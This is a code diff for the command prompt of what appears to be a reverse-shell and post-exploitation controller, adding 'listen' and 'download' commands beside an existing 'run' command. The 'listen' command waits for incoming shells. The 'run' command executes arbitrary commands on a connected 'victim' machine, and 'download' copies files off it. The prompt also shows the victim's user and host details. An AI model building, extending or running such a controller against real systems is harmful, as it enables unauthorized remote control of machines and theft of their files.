@@ -27,11 +27,13 @@ autocompleter = LongestPrefixCompleter([
     'hints',
     'run',
     'start',
-    'interactive'
+    'interactive',
+    'download',
+    'listen'
 ])
 
 def prompt(pheelshell: Pheelshell=None):
-    prompt_str = f'[Offline ({PHCAT_PROMPT_STR})]> '
+    prompt_str = f'[({PHCAT_PROMPT_STR})]> '
     if pheelshell:
         basic_host_information = pheelshell.get_playbook(EnumerateBasicHostInformation)
         victim_user = basic_host_information.get_user()
@@ -43,21 +45,33 @@ def prompt(pheelshell: Pheelshell=None):
         with autocompleter:
             command = pwn.str_input(prompt=prompt_str).strip()
 
+        # Handle listen command
         matches = re.search(r'listen (?P<address>.*):(?P<port>.*)', command)
         if matches:
-            address = matches.group('address')
-            port = matches.group('port')
-            listener.listen(address, port)
-        elif command == 'quit' or command == 'exit':
+            if not pheelshell:
+                address = matches.group('address')
+                port = matches.group('port')
+                listener.listen(address, port)
+                exit()
+            else:
+                print('Already connected to a victim. Start a new prompt to listen on a different IP.')
+                continue
+
+        # Handle quit command
+        if command == 'quit' or command == 'exit':
             exit()
-        elif command == 'start interactive':
+        
+        # Handle start interactive command
+        if command == 'start interactive':
             if not pheelshell:
                 print('Must be connected to a victim in order gain an interactive shell.')
                 continue
 
             # TODO: Not working
             pheelshell.start_interactive()
-        elif command == 'show hints':
+        
+        # Handle show hints command
+        if command == 'show hints':
             if not pheelshell:
                 print('Must be connected to a victim in order to show hints.')
                 continue
@@ -69,20 +83,28 @@ def prompt(pheelshell: Pheelshell=None):
 
             continue
 
+        # Handle download command
+        matches = re.search(r'download \'(?P<remote_path>.*)\' \'(?P<local_path>.*)\'', command)
+        if matches:
+            remote_path = matches.group('remote_path')
+            local_path = matches.group('local_path')
+            response_status = pheelshell.download(remote_path, local_path)
+            print(response_status)
+            continue
+
+        # Handle generic command with 'action type #index'
         matches = re.search(r'(?P<action>.*) (?P<type>.*) (?P<index>[0-9]+)', command)
         if not matches:
-            matches = re.search(r'(?P<action>.*) \'(?P<command>.*)\'', command)
+            # Handle run command
+            matches = re.search(r'run \'(?P<command>.*)\'', command)
             if matches:
-                action = matches.group('action')
-                if action == 'run':
-                    victim_command = matches.group('command')
-                    output = pheelshell.execute_command(victim_command)
-                    print(output)
-                    continue
-                else:
-                    matches = re.search(r'(?P<action>.*) (?P<type>.*)', command)
+                victim_command = matches.group('command')
+                output = pheelshell.execute_command(victim_command)
+                print(output)
+                continue
 
             if not matches:
+                # Handle generic command with 'action type'
                 matches = re.search(r'(?P<action>.*) (?P<type>.*)', command)
 
         if not matches:
